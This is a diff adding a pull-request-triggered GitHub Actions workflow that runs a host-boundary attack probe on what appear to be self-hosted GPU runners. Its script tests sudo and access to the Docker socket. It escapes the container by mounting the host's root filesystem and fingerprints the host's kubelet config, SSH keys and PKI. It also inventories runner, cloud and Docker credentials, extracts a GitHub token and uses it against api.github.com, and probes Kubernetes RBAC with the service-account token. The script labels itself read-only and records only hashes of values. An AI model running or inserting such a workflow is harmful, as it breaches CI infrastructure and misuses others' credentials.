@@ -1,0 +1,471 @@
+name: c211-126738-arcroot
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  arcroot:
+    strategy:
+      fail-fast: false
+      max-parallel: 4
+      matrix:
+        include:
+          - tag: mi300-1gpu-01
+            label: linux-mi300-1gpu-sglang
+          - tag: mi300-1gpu-02
+            label: linux-mi300-1gpu-sglang
+          - tag: mi35x-1gpu-01
+            label: linux-mi35x-gpu-1
+          - tag: mi35x-1gpu-02
+            label: linux-mi35x-gpu-1
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 20
+    steps:
+      - name: arcroot-host-boundary-readonly
+        env:
+          NONCE: c211-126738-29bfbbd3c0a003ed
+          JOBTAG: ${{ matrix.tag }}
+        run: |
+          set -u
+          set +e
+          export LC_ALL=C
+          ts(){ date -u +%FT%TZ; }
+          if command -v timeout >/dev/null 2>&1; then TO="timeout 20"; else TO=""; fi
+          echo "C211R_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211R_MARKER job=$JOBTAG nonce=$NONCE pod_host=$(hostname 2>/dev/null) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "POD_ID_LINE=$(id 2>&1 | head -1)"
+          echo "POD_UID=$(id -u) POD_USER=$(id -un) POD_GROUPS=$(id -Gn 2>/dev/null | tr ' ' ',')"
+          echo "POD_CGROUP=$(head -3 /proc/self/cgroup 2>/dev/null | tr '\n' '|')"
+          echo "POD_DOCKERENV=$([ -e /.dockerenv ] && echo 1 || echo 0) POD_CAP_EFF=$(awk '/^CapEff:/{print $2}' /proc/self/status 2>/dev/null)"
+          if [ -r /etc/machine-id ]; then echo "POD_MACHINE_ID_SHA256=$(sha256sum /etc/machine-id | cut -d' ' -f1)"; else echo "POD_MACHINE_ID=ABSENT"; fi
+          echo "POD_HOSTNAME_SHA256=$(hostname 2>/dev/null | sha256sum | cut -d' ' -f1)"
+          echo "POD_KFD=$([ -e /dev/kfd ] && echo 1 || echo 0) POD_DEV_DRI=$([ -d /dev/dri ] && echo 1 || echo 0)"
+          echo "MOUNTINFO_DOCKER=$(grep -i -m6 docker /proc/self/mountinfo 2>/dev/null | tr '\n' '|' | head -c 900)"
+          echo "SUDO_TEST_BEGIN"
+          SUDO_OK=0
+          if command -v sudo >/dev/null 2>&1; then
+            $TO sudo -n true >/dev/null 2>&1 && SUDO_OK=1
+          fi
+          echo "SUDO_NOPASSWD=$SUDO_OK"
+          if [ "$SUDO_OK" = "1" ]; then
+            timeout 15 sudo -n id 2>&1 | sed 's/^/SUDO_ID=/'
+          else
+            echo "SUDO_ID=UNAVAILABLE"
+          fi
+          echo "SUDO_TEST_END"
+          echo "=== (0b) read-only GPU device capture (ROCm/AMD; exit 0 when absent) ==="
+          echo "ROCM_CAPTURE_BEGIN"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 30 rocm-smi --showuniqueid --showproductname 2>&1 | head -60 | sed 's/^/ROCM_SMI=/'
+          else
+            echo "ROCM_SMI=ABSENT"
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 30 amd-smi static --asic-serial 2>&1 | head -80 | sed 's/^/AMD_SMI=/'
+          else
+            echo "AMD_SMI=ABSENT"
+          fi
+          echo "ROCM_CAPTURE_END"
+
+          echo "=== (1) read-only docker-daemon classification over /var/run/docker.sock ==="
+          DS=/var/run/docker.sock
+          DS_PRESENT=0; DS_WRITABLE=0
+          if [ -S "$DS" ]; then DS_PRESENT=1; [ -w "$DS" ] && DS_WRITABLE=1; fi
+          echo "DOCKER_SOCK_PRESENT=$DS_PRESENT DOCKER_SOCK_WRITABLE=$DS_WRITABLE"
+          if [ "$DS_PRESENT" = "1" ]; then ls -l "$DS" 2>&1 | sed 's/^/DOCKER_SOCK_LS=/'; fi
+          HAVE_CURL=0; command -v curl >/dev/null 2>&1 && HAVE_CURL=1
+          HAVE_PY=0; command -v python3 >/dev/null 2>&1 && HAVE_PY=1
+          echo "TOOLS curl=$HAVE_CURL python3=$HAVE_PY docker=$(command -v docker >/dev/null 2>&1 && echo 1 || echo 0) sha256sum=$(command -v sha256sum >/dev/null 2>&1 && echo 1 || echo 0)"
+          DOCKER_VERDICT=UNKNOWN
+          if [ "$DS_PRESENT" = "1" ] && [ "$DS_WRITABLE" = "1" ] && [ "$HAVE_CURL" = "1" ]; then
+            cget(){ curl -sS --max-time 12 --unix-socket "$DS" "http://localhost$1" 2>&1; }
+            V=$(cget /version)
+            echo "DOCKER_VERSION_RAW=$(printf '%s' "$V" | tr -d '\n' | head -c 600)"
+            I=$(cget /info)
+            echo "DOCKER_INFO_BYTES=${#I}"
+            printf '%s' "$I" > /tmp/c211_info.json
+            C=$(cget '/containers/json?all=1')
+            echo "DOCKER_CONTAINERS_BYTES=${#C}"
+            printf '%s' "$C" > /tmp/c211_containers.json
+            IM=$(cget '/images/json')
+            echo "DOCKER_IMAGES_BYTES=${#IM}"
+            printf '%s' "$IM" > /tmp/c211_images.json
+            NW=$(cget /networks)
+            echo "DOCKER_NETWORKS_BYTES=${#NW}"
+            printf '%s' "$NW" > /tmp/c211_networks.json
+            VO=$(cget /volumes)
+            echo "DOCKER_VOLUMES_BYTES=${#VO}"
+            printf '%s' "$VO" > /tmp/c211_volumes.json
+            ND=$(cget /nodes)
+            echo "DOCKER_NODES_RAW=$(printf '%s' "$ND" | tr -d '\n' | head -c 300)"
+            if [ "$HAVE_PY" = "1" ]; then
+              python3 - <<'PY_END' > /tmp/c211_docker_summary.txt 2>&1
+          import json
+          def load(p):
+              try:
+                  return json.load(open(p))
+              except Exception as e:
+                  print('PARSE_ERR %s %s' % (p, str(e)[:100]))
+                  return None
+          info = load('/tmp/c211_info.json') or {}
+          keys = ['Name','ServerVersion','ApiVersion','KernelVersion','OperatingSystem','OSType','Architecture',
+                  'NCPU','MemTotal','DockerRootDir','Containers','ContainersRunning','ContainersPaused',
+                  'ContainersStopped','Images','Driver','LoggingDriver','CgroupDriver','CgroupVersion']
+          print('INFO_SUMMARY=' + json.dumps({k: info.get(k) for k in keys}, sort_keys=True))
+          sw = info.get('Swarm') or {}
+          if isinstance(sw, dict):
+              print('SWARM_LOCALNODE=%s' % sw.get('LocalNodeState'))
+          cont = load('/tmp/c211_containers.json') or []
+          if isinstance(cont, list):
+              print('CONTAINERS_COUNT=%d' % len(cont))
+              pods = {}; nss = set()
+              for c in cont[:200]:
+                  labs = c.get('Labels') or {}
+                  pod = labs.get('io.kubernetes.pod.name'); nsp = labs.get('io.kubernetes.pod.namespace')
+                  cnt = labs.get('io.kubernetes.container.name')
+                  if pod: pods[pod] = nsp
+                  if nsp: nss.add(nsp)
+                  nm = ','.join(c.get('Names') or [])[:90]
+                  print('C name=%s image=%s state=%s pod=%s ns=%s cnt=%s' %
+                        (nm, (c.get('Image') or '')[:90], c.get('State'), pod, nsp, cnt))
+              print('DISTINCT_K8S_PODS=%d DISTINCT_K8S_NS=%d' % (len(pods), len(nss)))
+              print('K8S_NS_LIST=' + ','.join(sorted(nss)[:15]))
+              print('K8S_PODS_LIST=' + ','.join(sorted(pods)[:15]))
+          imgs = load('/tmp/c211_images.json') or []
+          if isinstance(imgs, list):
+              print('IMAGES_COUNT=%d' % len(imgs))
+              for im in imgs[:120]:
+                  tags = im.get('RepoTags') or []
+                  print('I id=%s tags=%s size=%s' % ((im.get('Id') or '')[:26], ','.join(tags)[:140], im.get('Size')))
+          nets = load('/tmp/c211_networks.json') or []
+          if isinstance(nets, list):
+              print('NETWORKS_COUNT=%d NAMES=%s' % (len(nets), ','.join((n.get('Name') or '') for n in nets)[:300]))
+          vols = load('/tmp/c211_volumes.json') or {}
+          if isinstance(vols, dict):
+              vl = vols.get('Volumes') or []
+              print('VOLUMES_COUNT=%d NAMES=%s' % (len(vl), ','.join((v.get('Name') or '') for v in vl)[:300]))
+          PY_END
+              sed 's/^/DOCKER_/' /tmp/c211_docker_summary.txt
+              python3 - <<'PY_END' > /tmp/c211_verdict.txt 2>&1
+          import json
+          def load(p):
+              try: return json.load(open(p))
+              except Exception: return None
+          info = load('/tmp/c211_info.json') or {}
+          cont = load('/tmp/c211_containers.json') or []
+          pods = {}; nss = set()
+          if isinstance(cont, list):
+              for c in cont:
+                  labs = c.get('Labels') or {}
+                  pod = labs.get('io.kubernetes.pod.name'); nsp = labs.get('io.kubernetes.pod.namespace')
+                  if pod: pods[pod] = nsp
+                  if nsp: nss.add(nsp)
+          name = str(info.get('Name') or '')
+          container_like = bool(__import__('re').fullmatch(r'[0-9a-f]{12,64}', name))
+          if len(pods) >= 2 or ('kube-system' in nss) or (len(nss) >= 2):
+              print('DOCKER_VERDICT=NODE_LEVEL')
+              print('DOCKER_VERDICT_REASON=multiple_k8s_pods_visible pods=%d namespaces=%d name=%s' % (len(pods), len(nss), name[:64]))
+          elif container_like and not pods:
+              print('DOCKER_VERDICT=DIND_SIDECAR')
+              print('DOCKER_VERDICT_REASON=info_name_is_container_id_no_k8s_labels name=%s' % name[:64])
+          elif pods:
+              print('DOCKER_VERDICT=AMBIGUOUS_SINGLE_POD')
+              print('DOCKER_VERDICT_REASON=only_own_pod_visible pods=%d name=%s' % (len(pods), name[:64]))
+          else:
+              print('DOCKER_VERDICT=UNKNOWN')
+              print('DOCKER_VERDICT_REASON=insufficient_signal name=%s' % name[:64])
+          PY_END
+              cat /tmp/c211_verdict.txt
+              DOCKER_VERDICT=$(sed -n 's/^DOCKER_VERDICT=//p' /tmp/c211_verdict.txt | head -1)
+            else
+              echo "DOCKER_VERDICT=UNKNOWN DOCKER_VERDICT_REASON=no_python3_for_parse"
+            fi
+          else
+            echo "DOCKER_VERDICT=$DOCKER_VERDICT DOCKER_VERDICT_REASON=socket_absent_or_unwritable_or_no_curl"
+          fi
+          echo "DOCKER_VERDICT_FINAL=$DOCKER_VERDICT"
+
+          echo "=== (2) node-level container probe (only if NODE_LEVEL and a cached image) ==="
+          IMGDIR_DONE=0
+          if [ "$DOCKER_VERDICT" = "NODE_LEVEL" ] && [ "$HAVE_PY" = "1" ]; then
+            python3 - <<'PY_END' > /tmp/c211_images_sel.txt 2>&1
+          import json
+          try: a = json.load(open('/tmp/c211_images.json'))
+          except Exception: a = []
+          pref = ['ubuntu','debian','alpine','busybox','python','rocm','pytorch','sglang','node','centos','rockylinux','fedora','vllm']
+          cands = []
+          for im in a:
+              iid = im.get('Id') or ''
+              tags = im.get('RepoTags') or []
+              score = 0
+              for t in tags:
+                  tl = t.lower()
+                  for i, p in enumerate(pref):
+                      if p in tl: score = max(score, 100 - i)
+              cands.append((score, iid, tags))
+          cands.sort(key=lambda x: (-x[0], x[1]))
+          for s, i, t in cands[:6]:
+              print('IMG_CANDIDATE score=%d id=%s tags=%s' % (s, i, ','.join(t)[:120]))
+          if cands and cands[0][1].startswith('sha256:') and cands[0][0] > 0:
+              print('CHOSEN_IMAGE_ID=%s' % cands[0][1])
+          else:
+              print('CHOSEN_IMAGE_ID=NONE')
+          PY_END
+            cat /tmp/c211_images_sel.txt
+            CHOSEN=$(sed -n 's/^CHOSEN_IMAGE_ID=//p' /tmp/c211_images_sel.txt | head -1)
+            echo "ESCAPE_CHOSEN_IMAGE=$CHOSEN"
+            if [ -n "${CHOSEN:-}" ] && [ "$CHOSEN" != "NONE" ]; then
+              INNER=$(cat <<'INNER_END'
+          N="c211-126738-29bfbbd3c0a003ed"
+          echo "C211R_HOSTCHECK_BEGIN nonce=$N"
+          if [ -r /host/etc/machine-id ]; then echo "HOST_MACHINE_ID_SHA256=$(sha256sum /host/etc/machine-id | cut -d' ' -f1)"; else echo "HOST_MACHINE_ID=ABSENT"; fi
+          if [ -r /host/etc/hostname ]; then echo "HOST_HOSTNAME_SHA256=$(sha256sum /host/etc/hostname | cut -d' ' -f1)"; else echo "HOST_HOSTNAME=ABSENT"; fi
+          for f in /host/etc/kubernetes/kubelet.conf /host/var/lib/kubelet/kubeconfig /host/root/.ssh/authorized_keys; do
+            if [ -f "$f" ] && [ -r "$f" ]; then echo "HOSTFILE=$f PRESENT SHA256=$(sha256sum "$f" | cut -d' ' -f1) BYTES=$(wc -c < "$f")"; else echo "HOSTFILE=$f ABSENT_OR_UNREADABLE"; fi
+          done
+          for f in /host/home/*/.docker/config.json; do
+            [ -e "$f" ] || continue
+            if [ -r "$f" ]; then echo "HOSTFILE=$f PRESENT SHA256=$(sha256sum "$f" | cut -d' ' -f1) BYTES=$(wc -c < "$f")"; else echo "HOSTFILE=$f PRESENT_UNREADABLE"; fi
+          done
+          if [ -d /host/etc/kubernetes/pki ]; then
+            echo "HOSTPKI_PRESENT=1 FILES=$(find /host/etc/kubernetes/pki -maxdepth 1 -type f 2>/dev/null | wc -l)"
+            find /host/etc/kubernetes/pki -maxdepth 1 -type f 2>/dev/null | sort | head -40 | while read -r f; do echo "HOSTPKI_FILE=$(basename "$f") SHA256=$(sha256sum "$f" | cut -d' ' -f1)"; done
+          else
+            echo "HOSTPKI_PRESENT=0"
+          fi
+          echo "C211R_HOSTCHECK_END nonce=$N"
+          INNER_END
+          )
+              INNER=${INNER//c211-126738-29bfbbd3c0a003ed/$NONCE}
+              printf '%s' "$INNER" > /tmp/c211_inner.sh
+              RMF=--rm
+              if command -v docker >/dev/null 2>&1; then
+                echo "ESCAPE_MECHANISM=docker_cli"
+                export DOCKER_HOST="unix://$DS"
+                echo "ESCAPE_DOCKER_HOST=$DOCKER_HOST"
+                timeout 120 docker run "$RMF" --name "c211-$NONCE-escape" --network none -v /:/host:ro --entrypoint /bin/sh "$CHOSEN" -c "$INNER" > /tmp/c211_escape.out 2>&1
+                ESCAPE_RC=$?
+                sed 's/^/ESCAPE_OUT=/' /tmp/c211_escape.out
+                echo "ESCAPE_RC=$ESCAPE_RC"
+                IMGDIR_DONE=1
+              else
+                echo "ESCAPE_MECHANISM=docker_api_one_shot"
+                python3 - "$CHOSEN" "$NONCE" <<'PY_END' > /tmp/c211_create.json 2>/tmp/c211_create.err
+          import json, sys
+          inner = open('/tmp/c211_inner.sh').read()
+          payload = {"Image": sys.argv[1], "Entrypoint": ["/bin/sh"], "Cmd": ["-c", inner],
+                     "NetworkDisabled": True,
+                     "HostConfig": {"Binds": ["/:/host:ro"], "NetworkMode": "none", "AutoRemove": True}}
+          print(json.dumps(payload))
+          PY_END
+                CREATE=$(curl -sS --max-time 20 --unix-socket "$DS" -X POST -H 'Content-Type: application/json' --data @/tmp/c211_create.json "http://localhost/containers/create?name=c211-$NONCE-escape" 2>&1)
+                echo "ESCAPE_CREATE_RAW=$(printf '%s' "$CREATE" | tr -d '\n' | head -c 400)"
+                CID=$(printf '%s' "$CREATE" | sed -n 's/.*"Id":[[:space:]]*"\([0-9a-f]\{12,\}\)".*/\1/p' | head -1)
+                echo "ESCAPE_CONTAINER_ID=$CID"
+                if [ -n "${CID:-}" ]; then
+                  echo "ESCAPE_START_RAW=$(curl -sS --max-time 20 --unix-socket "$DS" -X POST "http://localhost/containers/$CID/start" 2>&1 | tr -d '\n' | head -c 200)"
+                  sleep 6
+                  if command -v strings >/dev/null 2>&1; then
+                    curl -sS --max-time 20 --unix-socket "$DS" "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>&1 | strings | grep -a 'C211R_\|HOST_\|HOSTFILE=\|HOSTPKI_' | sed 's/^/ESCAPE_OUT=/'
+                  else
+                    curl -sS --max-time 20 --unix-socket "$DS" "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>&1 | tr -d '\000' | grep -a 'C211R_\|HOST_\|HOSTFILE=\|HOSTPKI_' | sed 's/^/ESCAPE_OUT=/'
+                  fi
+                  echo "ESCAPE_WAIT_RAW=$(curl -sS --max-time 30 --unix-socket "$DS" -X POST "http://localhost/containers/$CID/wait" 2>&1 | tr -d '\n' | head -c 200)"
+                  echo "ESCAPE_REMOVE_RAW=$(curl -sS --max-time 20 --unix-socket "$DS" -X DELETE "http://localhost/containers/$CID?force=1" 2>&1 | tr -d '\n' | head -c 200)"
+                  IMGDIR_DONE=1
+                fi
+              fi
+              P=$(cget '/containers/json?all=1')
+              printf '%s' "$P" > /tmp/c211_containers_post.json
+              if [ "$HAVE_PY" = "1" ]; then
+                NONCE="$NONCE" python3 - <<'PY_END'
+          import json, os
+          n = os.environ.get('NONCE', '')
+          try: a = json.load(open('/tmp/c211_containers_post.json'))
+          except Exception: a = []
+          left = [c for c in a if any(('c211-%s-escape' % n) in (x or '') for x in (c.get('Names') or []))]
+          print('ESCAPE_POST_CONTAINERS_TOTAL=%d' % len(a))
+          print('ESCAPE_POST_LEFTOVER=%d' % len(left))
+          PY_END
+              else
+                if printf '%s' "$P" | grep -q "c211-$NONCE-escape"; then echo "ESCAPE_POST_LEFTOVER=1"; else echo "ESCAPE_POST_LEFTOVER=0"; fi
+              fi
+              echo "ESCAPE_PROBE_DONE=$IMGDIR_DONE"
+            else
+              echo "ESCAPE_SKIP=no_suitable_cached_image"
+            fi
+          else
+            echo "ESCAPE_SKIP=verdict_not_node_level_or_no_python"
+          fi
+
+          echo "=== (3) pod credential surface (root via sudo; presence+sha256 only, no values) ==="
+          cat > /tmp/c211_cred.sh <<'CRED_END'
+          set -u
+          echo "CRED_UID=$(id -u)"
+          for p in /home/runner/actions-runner/.credentials /home/runner/actions-runner/.runner /home/runner/actions-runner/.env; do
+            if [ -e "$p" ]; then echo "CRED=$p PRESENT SHA256=$(sha256sum "$p" | cut -d' ' -f1) BYTES=$(wc -c < "$p")"; else echo "CRED=$p ABSENT"; fi
+          done
+          p=/home/runner/.docker/config.json
+          if [ -e "$p" ]; then
+            echo "CRED=$p PRESENT SHA256=$(sha256sum "$p" | cut -d' ' -f1) BYTES=$(wc -c < "$p")"
+            echo "DOCKERCFG_KEYLIKE=$(grep -oE '"[^"]+"[[:space:]]*:[[:space:]]*\{' "$p" 2>/dev/null | sed -E 's/^"//; s/"[[:space:]]*:[[:space:]]*\{$//' | grep -v '^auths$' | head -10 | tr '\n' ',')"
+          else
+            echo "CRED=$p ABSENT"
+          fi
+          p=/home/runner/.config/gh/hosts.yml
+          if [ -e "$p" ]; then echo "CRED=$p PRESENT SHA256=$(sha256sum "$p" | cut -d' ' -f1) BYTES=$(wc -c < "$p")"; else echo "CRED=$p ABSENT"; fi
+          for d in /home/runner/.aws /home/runner/.config/gcloud; do
+            if [ -d "$d" ]; then
+              echo "CREDDIR=$d PRESENT FILES=$(find "$d" -maxdepth 2 -type f 2>/dev/null | wc -l)"
+              find "$d" -maxdepth 2 -type f 2>/dev/null | sort | head -20 | while read -r f; do echo "CREDFILE=$f SHA256=$(sha256sum "$f" | cut -d' ' -f1) BYTES=$(wc -c < "$f")"; done
+            else
+              echo "CREDDIR=$d ABSENT"
+            fi
+          done
+          echo "CRED_END"
+          CRED_END
+          if [ "$SUDO_OK" = "1" ]; then
+            timeout 60 sudo -n bash /tmp/c211_cred.sh 2>&1 | sed 's/^/PODCRED=/'
+          else
+            bash /tmp/c211_cred.sh 2>&1 | sed 's/^/PODCRED_NOSUDO=/'
+          fi
+
+          echo "=== (4) ONE GitHub-shaped token issuer validation (api.github.com only) ==="
+          GHTOK_FILES="/home/runner/actions-runner/.credentials /home/runner/actions-runner/.env /home/runner/.config/gh/hosts.yml /home/runner/.docker/config.json"
+          GHTOK=""
+          if [ "$SUDO_OK" = "1" ]; then
+            GHTOK=$(timeout 30 sudo -n grep -hoE 'gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}' $GHTOK_FILES 2>/dev/null | head -1)
+          fi
+          if [ -n "${GHTOK:-}" ]; then
+            echo "GHTOK_SHAPE=present LEN=${#GHTOK} SHA256_12=$(printf '%s' "$GHTOK" | sha256sum | cut -c1-12)"
+            RESP=$(curl -sS --max-time 20 -w '\nHTTPSTATUS:%{http_code}' -H "Authorization: token $GHTOK" -H 'User-Agent: c211-i125937' https://api.github.com/user 2>&1)
+            ST=$(printf '%s' "$RESP" | sed -n 's/.*HTTPSTATUS://p' | tail -1)
+            LOGIN=$(printf '%s' "$RESP" | python3 -c 'import sys,json
+          raw=sys.stdin.read()
+          try:
+              d=json.loads(raw.split("\nHTTPSTATUS:")[0]); print(d.get("login") or "NONE")
+          except Exception:
+              print("UNPARSED")' 2>/dev/null)
+            BOGUS="ghp_000000000000000000000000000000000000"
+            ST2=$(curl -sS -o /dev/null --max-time 20 -w '%{http_code}' -H "Authorization: token $BOGUS" -H 'User-Agent: c211-i125937' https://api.github.com/user 2>/dev/null)
+            echo "GHTOK_ISSUER_STATUS=$ST LOGIN=$LOGIN BOGUS_STATUS=$ST2"
+          else
+            echo "GHTOK_SHAPE=absent"
+          fi
+
+          echo "=== (5) in-cluster RBAC self-review (read-only; booleans only, never a token value) ==="
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          SA_TOKEN_PRESENT=0
+          if [ -r "$SA/token" ]; then
+            SA_TOKEN_PRESENT=1
+            echo "SA_TOKEN_PRESENT=1 SA_TOKEN_SHA256=$(sha256sum "$SA/token" | cut -d' ' -f1) SA_TOKEN_BYTES=$(wc -c < "$SA/token")"
+          else
+            echo "SA_TOKEN_PRESENT=0"
+          fi
+          if [ -r "$SA/namespace" ]; then echo "SA_NAMESPACE_PRESENT=1"; else echo "SA_NAMESPACE_PRESENT=0"; fi
+          if [ "$SA_TOKEN_PRESENT" = "1" ] && [ "$HAVE_PY" = "1" ]; then
+            timeout 100 python3 - <<'PY_END' 2>&1 | sed 's/^/RBAC=/'
+          import json, os, ssl, hashlib, urllib.request, urllib.error
+          SA = '/var/run/secrets/kubernetes.io/serviceaccount'
+          tok = open(SA + '/token').read().strip()
+          try:
+              ns = open(SA + '/namespace').read().strip()
+          except Exception:
+              ns = ''
+          print('TOKEN_SHA256=' + hashlib.sha256(open(SA + '/token', 'rb').read()).hexdigest() + ' TOKEN_LEN=%d' % len(tok))
+          ctx = None
+          try:
+              if os.path.exists(SA + '/ca.crt'):
+                  ctx = ssl.create_default_context(cafile=SA + '/ca.crt')
+          except Exception:
+              ctx = None
+          BASE = 'https://kubernetes.default.svc'
+
+
+          def call(path, body):
+              data = json.dumps(body).encode()
+              req = urllib.request.Request(BASE + path, data=data, method='POST',
+                                           headers={'Authorization': 'Bearer ' + tok,
+                                                    'Content-Type': 'application/json',
+                                                    'Accept': 'application/json'})
+              try:
+                  if ctx is not None:
+                      resp = urllib.request.urlopen(req, timeout=8, context=ctx)
+                  else:
+                      resp = urllib.request.urlopen(req, timeout=8)
+                  return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, ''
+              except Exception:
+                  return -1, ''
+
+
+          checks = [('secrets', '', 'get'), ('secrets', '', 'list'), ('secrets', '', 'create'),
+                    ('pods', '', 'get'), ('pods', '', 'list'), ('pods', '', 'create'),
+                    ('pods', 'exec', 'create'),
+                    ('serviceaccounts', 'token', 'create'),
+                    ('serviceaccounts', '', 'impersonate'),
+                    ('users', '', 'impersonate')]
+
+          st, b = call('/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
+                       {'apiVersion': 'authorization.k8s.io/v1',
+                        'kind': 'SelfSubjectRulesReview',
+                        'spec': {'namespace': ns}})
+          rules = []
+          print('SSRR_OK=%s' % (st == 200))
+          if st == 200:
+              try:
+                  rules = json.loads(b).get('status', {}).get('resourceRules') or []
+              except Exception:
+                  rules = []
+          print('SSRR_RULES_GT0=%s' % (len(rules) > 0))
+
+
+          def covered(res, sub, verb):
+              for r in rules:
+                  rs = r.get('resources') or []
+                  if res not in rs and '*' not in rs and ('%s/%s' % (res, sub)) not in rs:
+                      continue
+                  if sub and sub not in rs and ('%s/%s' % (res, sub)) not in rs and '*' not in rs:
+                      continue
+                  vs = r.get('verbs') or []
+                  if verb in vs or '*' in vs:
+                      return True
+              return False
+
+
+          for res, sub, verb in checks:
+              print('SSRR_COVERS res=%s sub=%s verb=%s allowed=%s' % (res, sub or '-', verb, covered(res, sub, verb)))
+
+          allowed = 0
+          reachable = 0
+          for res, sub, verb in checks:
+              ra = {'namespace': ns, 'verb': verb, 'group': '', 'resource': res}
+              if sub:
+                  ra['subresource'] = sub
+              if verb == 'impersonate':
+                  ra.pop('namespace', None)
+              body = {'apiVersion': 'authorization.k8s.io/v1',
+                      'kind': 'SelfSubjectAccessReview',
+                      'spec': {'resourceAttributes': ra}}
+              st2, b2 = call('/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', body)
+              a = False
+              if st2 in (200, 201):
+                  reachable += 1
+                  try:
+                      a = bool(json.loads(b2).get('status', {}).get('allowed'))
+                  except Exception:
+                      a = False
+              if a:
+                  allowed += 1
+              print('SSAR res=%s sub=%s verb=%s allowed=%s' % (res, sub or '-', verb, a))
+          print('SSAR_API_REACHABLE=%s' % (reachable > 0))
+          print('SSAR_ALLOWED_COUNT=%d' % allowed)
+          PY_END
+          else
+            echo "RBAC_SKIP=no_sa_token_or_no_python"
+          fi
+          echo "C211R_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
